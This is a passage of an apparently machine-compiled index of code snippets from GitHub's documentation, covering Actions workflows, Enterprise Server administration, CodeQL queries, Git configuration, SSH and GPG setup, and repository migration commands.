another repository, the byte count is added to the existing total.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nrepo_langs.each do |lang, count|\n  if !language_obj[lang]\n    language_obj[lang] = count\n  else\n    language_obj[lang] += count\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Dockerfile example with entrypoint.sh\nDESCRIPTION: This Dockerfile sets up a container that runs code by copying a shell script (entrypoint.sh) into the container and then executing it when the container starts. This allows for passing arguments defined in the action's metadata file to the script.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions.md#_snippet_1\n\nLANGUAGE: dockerfile\nCODE:\n```\n# Container image that runs your code\nFROM debian:9.5-slim\n\n# Copies your code file from your action repository to the filesystem path `/` of the container\nCOPY entrypoint.sh /entrypoint.sh\n\n# Executes `entrypoint.sh` when the Docker container starts up\nENTRYPOINT [\"/entrypoint.sh\"]\n```\n\n----------------------------------------\n\nTITLE: Configure Amazon S3 Storage Connection (ghe-config)\nDESCRIPTION: These commands configure the necessary parameters for connecting to Amazon S3 storage for GitHub Actions. You must provide the bucket name, service URL, access key ID, and access secret.  These settings enable GitHub Actions to store and retrieve artifacts from your specified S3 bucket.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.s3.bucket-name \"S3 BUCKET NAME\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.s3.service-url \"S3 SERVICE URL\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.s3.access-key-id \"S3 ACCESS KEY ID\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.s3.access-secret \"S3 ACCESS SECRET\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Content Display for GHES using Liquid\nDESCRIPTION: This snippet uses the Liquid templating language to conditionally display content if the version being viewed is GitHub Enterprise Server.  It relies on the `ifversion ghes` tag to check the product version. The content displayed recommends time synchronization for 2FA.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/two_fa/ghes_ntp.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion ghes %}The verification of two-factor authentication codes requires an accurate time on both the client's device and server. Site administrators should ensure time synchronization is configured and accurate. For more information, see [AUTOTITLE](/admin/configuration/configuring-network-settings/configuring-time-synchronization).{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Custom Transformer for Environment Variable (Ruby)\nDESCRIPTION: Shows how to create custom transformers for environment variables, allowing you to map environment variables from the source CI/CD pipeline to GitHub Actions. Examples include setting a static value, removing an environment variable, mapping to a secret, and using regular expressions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nenv \"OCTO\", \"CAT\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\nenv \"MONA_LISA\", nil\n```\n\nLANGUAGE: ruby\nCODE:\n```\nenv \"MONALISA\", secret(\"OCTOCAT\")\n```\n\nLANGUAGE: ruby\nCODE:\n```\nenv /.*/, nil\n```\n\nLANGUAGE: ruby\nCODE:\n```\nenv /^(.+)_SSH_KEY/, secret(\"%s_SSH_KEY\")\n```\n\n----------------------------------------\n\nTITLE: Displaying CLI content\nDESCRIPTION: This snippet shows how to display content specific to the command-line interface (CLI) using the `{% cli %}` tag. The code inside the tag is intended for CLI users and often includes commands and examples relevant to command-line usage. It uses a markdown code block to format the command-line content.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tool-platform-switcher.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncli content\n```\n\n----------------------------------------\n\nTITLE: Authenticating Installation - Ruby\nDESCRIPTION: This method authenticates a GitHub App installation. It retrieves the installation ID from the payload, creates an access token using the application client, and initializes an Octokit client with the bearer token. The Octokit client is then used to interact with the GitHub API on behalf of the installation.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\ndef authenticate_installation(payload)\n  @installation_id = payload['installation']['id']\n  @installation_token = @app_client.create_app_installation_access_token(@installation_id)[:token]\n  @installation_client = Octokit::Client.new(bearer_token: @installation_token)\nend\n```\n\n----------------------------------------\n\nTITLE: Copying SSH Public Key to Clipboard (Windows)\nDESCRIPTION: Copies the content of the id_ed25519.pub file to the clipboard on Windows using the `clip` command.  This assumes that Windows Subsystem for Linux (WSL) is *not* being used. If `clip` isn't working, alternative methods like opening the file in a text editor are suggested.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/copy-ssh-public-key.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ clip < ~/.ssh/id_ed25519.pub\n# Copies the contents of the id_ed25519.pub file to your clipboard\n```\n\n----------------------------------------\n\nTITLE: Running a Subset of Queries in a CodeQL Pack\nDESCRIPTION: This example demonstrates how to run a subset of queries within a CodeQL pack by specifying a path at the end of the pack specification.  Different examples are shown for referencing queries or query suites within a pack. Requires a CodeQL database `<db>`. Output is saved as `results`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze --format=sarif-latest --output=results <db> \\\n    codeql/cpp-queries:experimental/Security\n```\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze --format=sarif-latest --output=results <db> \\\n    'codeql/cpp-queries:experimental/Likely Bugs/RedundantNullCheckParam.ql'\n```\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze --format=sarif-latest --output=results <db> \\\n   'codeql/cpp-queries@~0.0.3:codeql-suites/cpp-security-and-quality.qls'\n```\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze --format=sarif-latest --output=results <db> \\\n    path:C:/Users/ci/workspace@2/security/query.ql\n```\n\n----------------------------------------\n\nTITLE: Delete Migration Archive with DELETE Request (Shell)\nDESCRIPTION: This snippet shows how to delete a migration archive using a DELETE request to the GitHub Migrations API. It requires an access token for authentication and the unique ID of the migration. This action is typically performed after the archive has been successfully imported.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-githubcom.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer GITHUB_ACCESS_TOKEN\" \\\n-X DELETE \\\n-H \"Accept: application/vnd.github+json\" \\\nhttps://api.github.com/orgs/ORG_NAME/migrations/ID/archive\n```\n\n----------------------------------------\n\nTITLE: Configuring Datacenter for Each Node\nDESCRIPTION: These commands configure the datacenter location for the primary and replica nodes in a geo-replication setup. Replace `[PRIMARY DC NAME]`, `[FIRST REPLICA DC NAME]`, and `[SECOND REPLICA DC NAME]` with the appropriate datacenter names for each node. This helps in routing requests to the nearest active replica.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n(primary)$ ghe-repl-node --datacenter [PRIMARY DC NAME]\n```\n\nLANGUAGE: Shell\nCODE:\n```\n(replica1)$ ghe-repl-node --datacenter [FIRST REPLICA DC NAME]\n```\n\nLANGUAGE: Shell\nCODE:\n```\n(replica2)$ ghe-repl-node --datacenter [SECOND REPLICA DC NAME]\n```\n\n----------------------------------------\n\nTITLE: Generating SSH Certificate with Multiple Login Extensions\nDESCRIPTION: This command generates an SSH certificate with multiple login extensions, allowing a single certificate to be used across different GitHub products (e.g., GitHub.com and GitHub Enterprise Server).  It specifies a username for each product. The certificate will be valid for 1 day.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nssh-keygen -s ./ca-key -V '+1d' -I KEY-IDENTITY -O extension:login@github.com=USERNAME-1 extension:login@HOSTNAME=USERNAME-2 ./user-key.pub\n```\n\n----------------------------------------\n\nTITLE: Exporting a PKCS #12 File with OpenSSL\nDESCRIPTION: This command exports a PKCS #12 (PFX) file using OpenSSL, combining the certificate and private key into a single file. This format is commonly used for importing certificates into applications and servers. The exported file is saved as pfgh256.p12.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/configuring-authentication-and-provisioning-with-pingfederate.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nopenssl pkcs12 -export -in pfgh256.crt -inkey MyPrivateKey.key -out pfgh256.p12\n```\n\n----------------------------------------\n\nTITLE: Configure Git to Sign Commits and Tags Globally\nDESCRIPTION: This snippet configures Git to automatically sign all commits and tags using GPG. It sets the `commit.gpgsign` and `tag.gpgSign` options to `true` globally, ensuring that all future commits and tags are signed. Requires Git to be installed and configured with a GPG key.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/set-auto-sign.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global commit.gpgsign true\ngit config --global tag.gpgSign true\n```\n\n----------------------------------------\n\nTITLE: Setting the environment variable in .env file\nDESCRIPTION: This example shows how to set the `ACTIONS_RUNNER_HOOK_JOB_STARTED` environment variable in the `.env` file within the self-hosted runner application directory. This will trigger the script located at `/opt/runner/cleanup_script.sh` before each job runs. The runner needs to be restarted for the changes to take effect.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/running-scripts-before-or-after-a-job.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nACTIONS_RUNNER_HOOK_JOB_STARTED=/opt/runner/cleanup_script.sh\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Copilot language support via settings.json\nDESCRIPTION: This JSON snippet shows how to configure GitHub Copilot to be enabled or disabled for specific languages within the settings.json file. It defines global enablement, disables YAML and plaintext, and enables markdown, JavaScript, and Python.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"editor.inlineSuggest.enabled\": true,\n    \"github.copilot.enable\": {\n        \"*\": true,\n        \"yaml\": false,\n        \"plaintext\": false,\n        \"markdown\": true,\n        \"javascript\": true,\n        \"python\": true\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Migration Status with GraphQL\nDESCRIPTION: This GraphQL query retrieves the status of a specific organization migration. It takes the migration ID as input and returns information about the migration state, failure reason (if any), and the number of remaining and total repositories. This helps in monitoring the progress and identifying potential issues during the migration.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-organizations-from-githubcom-to-github-enterprise-cloud.md#_snippet_2\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery (\n  $id: ID!\n){\n  node( id: $id ) {\n    ... on OrganizationMigration {\n      id\n\t\t\tsourceOrgUrl\n\t\t\ttargetOrgName\n      state\n      failure_reason\n      remaining_repositories_count\n      total_repositories_count\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Changing Directory for Git LFS Installation (macOS/Linux)\nDESCRIPTION: This command changes the current working directory in the terminal to the directory where the downloaded and unzipped Git LFS files are located. This is a necessary step before running the installation script.  The specific directory will depend on the user's download location and the version of Git LFS downloaded.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/installing-git-large-file-storage.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncd ~/Downloads/git-lfs-X.X.X\n```\n\n----------------------------------------\n\nTITLE: Checking Extension Storage Usage in Codespace (Shell)\nDESCRIPTION: This shell command is used within a GitHub Codespace to determine the amount of disk space consumed by installed VS Code extensions. It uses `du` to calculate the total size of the extensions directory. This helps users identify and remove unnecessary extensions to reduce storage usage.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-included-usage.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ndu -h -s ~/.vscode-remote/extensions\n```\n\n----------------------------------------\n\nTITLE: Disabling Jekyll's Syntax Highlighting\nDESCRIPTION: This YAML snippet demonstrates how to disable Jekyll's built-in syntax highlighting feature. By setting `syntax_highlighter_opts: disable: true` within the `kramdown` section of the `_config.yml` file, Jekyll's default syntax highlighting is turned off, allowing users to implement alternative highlighters like highlight.js.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/about-github-pages-and-jekyll.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nkramdown:\n  syntax_highlighter_opts:\n    disable : true\n```\n\n----------------------------------------\n\nTITLE: Disable Copilot Code Completions in VS Code\nDESCRIPTION: This snippet disables GitHub Copilot's code completion feature in VS Code for a specific project. It involves creating a `.vscode` folder and a `settings.json` file within the project's root directory. This configuration prevents Copilot from suggesting code completions, encouraging users to write more code themselves and deepen their understanding of programming concepts.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/setting-up-copilot-for-learning-to-code.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"github.copilot.enable\": {\n        \"*\": false\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Versioning Product Landing Example\nDESCRIPTION: This YAML snippet demonstrates how to specify version availability for a product landing example using the `versions` property. It uses semver notation to define the supported versions, allowing for conditional rendering of example blocks based on the documentation version.\nSOURCE: https://github.com/github/docs/blob/main/data/product-examples/README.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- title: Dependabot version update PR\n  description: >-\n    Example pull request generated by the Dependabot version\n    updates configuration in the Super linter repository.\n  href: /github/super-linter/pull/1398\n  languages:\n  tags:\n    - Dependabot\n    - Version updates\n    - Pull requests\n  versions:\n    fpt: '*'\n```\n\n----------------------------------------\n\nTITLE: Auditing Users for Custom Mapping - Shell\nDESCRIPTION: This command generates a CSV file containing users being migrated, in a format suitable for applying custom mappings. It uses the `ghe-migrator audit` command with the `-m user` flag and the Migration GUID.  The output is directed to a `users.csv` file.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator audit -m user -g MIGRATION-GUID > users.csv\n```\n\n----------------------------------------\n\nTITLE: Running the login command in shell\nDESCRIPTION: This shell command executes the `app_cli.rb` script with the `login` argument. It initiates the device flow authentication process.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_22\n\nLANGUAGE: shell\nCODE:\n```\n./app_cli.rb login\n```\n\n----------------------------------------\n\nTITLE: Allowing NES to take a node offline using nes set-node-adminaction\nDESCRIPTION: This snippet shows how to allow the Node Eligibility Service (NES) to take a node offline automatically when it becomes ineligible. It sets the `adminaction` state to `approved` for a specific node using the `nes set-node-adminaction` command. Replace HOSTNAME with the actual hostname.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-adminaction approved HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Hiding Content with HTML Comments\nDESCRIPTION: This snippet demonstrates how to hide content from rendered Markdown by placing it within an HTML comment. Content within the HTML comment tags will not be displayed in the final rendered output.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_16\n\nLANGUAGE: text\nCODE:\n```\n<!-- This content will not appear in the rendered Markdown -->\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Jinja\nDESCRIPTION: This Jinja template checks if the GitHub Enterprise Server version is not 'ghes'. If the condition is true, it renders a callout for {% data variables.product.prodname_pages %}. This allows displaying different content based on the environment.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/data/reusables/gated-features/not-for-ghes.md#_snippet_0\n\nLANGUAGE: Jinja\nCODE:\n```\n{% ifversion not ghes %}Callout for {% data variables.product.prodname_pages %}{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Installing Brew packages on macOS runners\nDESCRIPTION: This snippet demonstrates how to install Brew packages and casks on a macOS runner within a GitHub Actions workflow. It updates Brew using `brew update` and installs the `gh` CLI using `brew install gh` and Microsoft Edge using `brew install --cask microsoft-edge`. The workflow is triggered on `push` events.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-github-hosted-runners/customizing-github-hosted-runners.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build on macOS\non: push\n\njobs:\n  build:\n    runs-on: macos-latest\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Install GitHub CLI\n        run: |\n          brew update\n          brew install gh\n      - name: Install Microsoft Edge\n        run: |\n          brew update\n          brew install --cask microsoft-edge\n```\n\n----------------------------------------\n\nTITLE: Adding Second Replica to Geo-Replication\nDESCRIPTION: These commands add and start the second replica in a geo-replication configuration. The `--add` flag ensures that the existing replication configuration isn't overwritten. Replace `PRIMARY_IP` with the primary server's IP address. The second command starts the replication process.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n(replica2)$ ghe-repl-setup --add PRIMARY_IP\n```\n\nLANGUAGE: Shell\nCODE:\n```\n(replica2)$ ghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Listing Affected Pull Requests\nDESCRIPTION: This command uses `grep` to list the pull requests affected by the history rewrite. It searches for lines starting with `refs/pull/.*/head$` in the `.git/filter-repo/changed-refs` file.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ grep '^refs/pull/.*/head$' .git/filter-repo/changed-refs\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row (GHES Not Present) - Liquid\nDESCRIPTION: This Liquid snippet conditionally displays a table row when the `ghes` version is not present.  It uses the `not ghes` condition within the `ifversion` tag. The snippet is embedded directly in the Markdown table to manage which rows are displayed based on the absence of a specific version.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/table-with-ifversions.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not ghes %}\n| GHES | Not |\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Verifying TTL settings using nes get-node-ttl\nDESCRIPTION: This snippet demonstrates how to retrieve the current Time To Live (TTL) settings for the Node Eligibility Service (NES) using the `nes get-node-ttl` command. It retrieves the TTL for all states.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnes get-node-ttl all\n```\n\n----------------------------------------\n\nTITLE: Retrieving Pull Requests with REST\nDESCRIPTION: This REST API call retrieves a list of pull requests. Determining if each pull request is mergeable requires an additional call to get the detailed representation. The payload contains unnecessary data, especially if you only want to know `number` and `mergeable` attributes.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl -v {% data variables.product.rest_url %}/repos/:owner/:repo/pulls\n```\n\n----------------------------------------\n\nTITLE: Checking Runner Set Listener Logs - Bash\nDESCRIPTION: This bash command uses `kubectl` to retrieve the logs of the runner set listener pod.  It filters pods by the `auto-scaling-runner-set-namespace` and `auto-scaling-runner-set-name` labels.  Replace `<CONTROLLER_NAMESPACE>` with the actual namespace.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nkubectl logs -n <CONTROLLER_NAMESPACE> -l auto-scaling-runner-set-namespace=arc-systems -l auto-scaling-runner-set-name=arc-runner-set\n```\n\n----------------------------------------\n\nTITLE: Creating Code Blocks in Markdown\nDESCRIPTION: This code snippet illustrates how to format code into its own distinct block using triple backticks (```). This creates a preformatted block where code can be written.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\nSome basic Git commands are:\n```\ngit status\ngit add\ngit commit\n```\n```\n\n----------------------------------------\n\nTITLE: Enabling Development Logging in Sinatra (Ruby)\nDESCRIPTION: This code block configures Sinatra to enable verbose logging during development. It sets the logging level to DEBUG, which prints detailed information to the console, aiding in debugging and development. It's specifically active only in the 'development' environment.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# Turn on Sinatra's verbose logging during development\nconfigure :development do\n  set :logging, Logger::DEBUG\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Organization Security Product Defaults (Ruby)\nDESCRIPTION: This code snippet uses `ghe-console` to check if any organizations have security products enabled by default. It helps determine upgrade eligibility from GitHub Enterprise Server 3.14 to 3.16.0. The command is executed within the `ghe-console` environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/troubleshooting-upgrades/known-issues-with-upgrades-to-your-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-console -y\nOrganization.any? { |o| [o.vulnerability_updates_enabled_for_new_repos?, o.security_alerts_enabled_for_new_repos?, o.dependency_graph_enabled_for_new_repos?, o.advanced_security_enabled_on_new_repos?, SecretScanning::Features::Org::TokenScanning.new(o).secret_scanning_enabled_for_new_repos?, SecretScanning::Features::Org::PushProtection.new(o).enabled_for_new_repos?].any? }\n```\n\n----------------------------------------\n\nTITLE: Governor Help Output (ghe-governor -h)\nDESCRIPTION: This is the help output for the `ghe-governor` utility, showing usage information, available subcommands, and options. This is used for understanding available operations and arguments.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_61\n\nLANGUAGE: text\nCODE:\n```\nghe-governor -h\nUsage: ghe-governor [-h] <subcommand> args\n\nOPTIONS:\n  -h | --help        Show this message.\n\nValid subcommands are:\n  aggregate              Find the top (n) groups of queries for a grouping function and metric\n  health                 Summarize all recent activity on one or more servers\n  top                    Find the top (n) queries for a given metric\n  dump                   Dump individual operations\n  test-quotas            Check quota information\n\nTry ghe-governor <subcommand> --help for more information on the arguments each subcommand takes.\n```\n\n----------------------------------------\n\nTITLE: Setting GitHub Enterprise Trust Domain\nDESCRIPTION: This command configures the GitHub Enterprise Cloud trust domain when installing the `trust-policies` chart.  Replace `YOUR-GHEC-TRUST-DOMAIN` with the trust domain retrieved using the `gh api meta` command.  This setting is necessary for GitHub Enterprise Cloud accounts with data residency.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n--set-json 'policy.trust.githubTrustDomain=\"YOUR-GHEC-TRUST-DOMAIN\"'\n```\n\n----------------------------------------\n\nTITLE: Fetching Git LFS Objects from the Old Remote\nDESCRIPTION: This snippet fetches all LFS objects from the old remote (`origin`) using `git lfs fetch`. This downloads the large files managed by LFS to the local repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-repositories-in-your-enterprise/configuring-git-large-file-storage-for-your-enterprise.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ git lfs fetch origin --all\n> Scanning for all objects ever referenced...\n> ✔ 16 objects found\n> Fetching objects...\n> Git LFS: (16 of 16 files) 48.71 MB / 48.85 MB\n```\n\n----------------------------------------\n\nTITLE: Checking out submodules in Travis CI YAML\nDESCRIPTION: This snippet configures Travis CI to disable the checkout of Git submodules. The `git` key is used with the `submodules` set to `false`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ngit:\n  submodules: false\n```\n\n----------------------------------------\n\nTITLE: Workflow Run Trigger Ignoring Specific Branch (YAML)\nDESCRIPTION: This snippet configures a workflow to trigger when another workflow named 'Build' runs on any branch except 'canary'.  The `on.workflow_run` section specifies the triggering workflow and the event types to listen for (requested). The `branches-ignore` filter excludes the 'canary' branch.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/section-specifying-branches.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches-ignore:\n      - \"canary\"\n```\n\n----------------------------------------\n\nTITLE: List Git configuration with origin (shell)\nDESCRIPTION: This command lists all Git configuration settings along with their origin file. This is useful for identifying conflicting configuration settings that might be overriding the default settings set by GitHub Codespaces for GPG signing.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-gpg-verification-for-github-codespaces.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git config --list --show-origin\nfile:/usr/local/etc/gitconfig   credential.helper=/.codespaces/bin/gitcredential_github.sh\nfile:/usr/local/etc/gitconfig   user.name=Mona Lisa\nfile:/usr/local/etc/gitconfig   gpg.program=/.codespaces/bin/gh-gpgsign\n```\n\n----------------------------------------\n\nTITLE: Generate Migration Archive with GitHub CLI\nDESCRIPTION: This command generates a migration archive using the `gh bbs2gh migrate-repo` command with limited arguments. It requires specifying the Bitbucket Server URL, project, and repository name. The command generates the archive and prints its path in the output.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh migrate-repo --bbs-server-url BBS-SERVER-URL \\\n  --bbs-project PROJECT \\\n  --bbs-repo CURRENT-NAME\n```\n\n----------------------------------------\n\nTITLE: Importing Query Suites from a Specific Pack - YAML\nDESCRIPTION: This example imports a query suite from a specific CodeQL pack using the `import` and `from` instructions. It also specifies a compatible version range using the `version` field, ensuring compatibility between the current suite and the imported suite. If no version is specified, the most recent version of the pack is used.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\n- import: <path-to-query-suite>\n  from: <ql-pack>\n  version: ^x.y.z\n```\n\n----------------------------------------\n\nTITLE: Querying Audit Logs for SCIM API Failures\nDESCRIPTION: This audit log query searches for `external_identity.scim_api_failure` events on a specific date, helping to identify and troubleshoot SCIM API failures. This query is useful when initial user provisioning attempts fail, and you need to find error information.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_8\n\nLANGUAGE: text\nCODE:\n```\naction:external_identity.scim_api_failure\n```\n\n----------------------------------------\n\nTITLE: Liquid versioning in markdown list\nDESCRIPTION: An example of using liquid to version parts of a markdown list.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_10\n\nLANGUAGE: markdown\nCODE:\n```\n1. This step is for all versions\n{% raw %}{%- ifversion ghes %}{% endraw %}\n1. This step is for GHES only\n{% raw %}{%- endif %}{% endraw %}\n1. This row is for all versions\n```\n\n----------------------------------------\n\nTITLE: Mapping Committers in Text File\nDESCRIPTION: This is an example of the format used to map Mercurial committers to Git committers within the `committers.txt` file. The left side is the committer string from the Mercurial repo, and the right side is the new committer information to use in Git. Ensure proper formatting with quotes and angle brackets.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-mercurial-repository.md#_snippet_1\n\nLANGUAGE: Text\nCODE:\n```\n“The Octocat <octocato@gmail.com>”=\"Octocat <octocat@github.com>\"\n```\n\n----------------------------------------\n\nTITLE: Starting the Banking Application in Node.js\nDESCRIPTION: This line starts the banking application by initially calling the `promptUser()` function, which displays the menu and begins the interaction loop with the user.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\npromptUser();\n```\n\n----------------------------------------\n\nTITLE: Generating mannequin CSV with gh bbs2gh\nDESCRIPTION: This command generates a CSV file containing a list of mannequins for a specified organization. The `DESTINATION` parameter should be replaced with the target GitHub organization, and `FILENAME.csv` with the desired name for the output CSV file. This CSV is used for bulk mannequin reclamation.\nSOURCE: 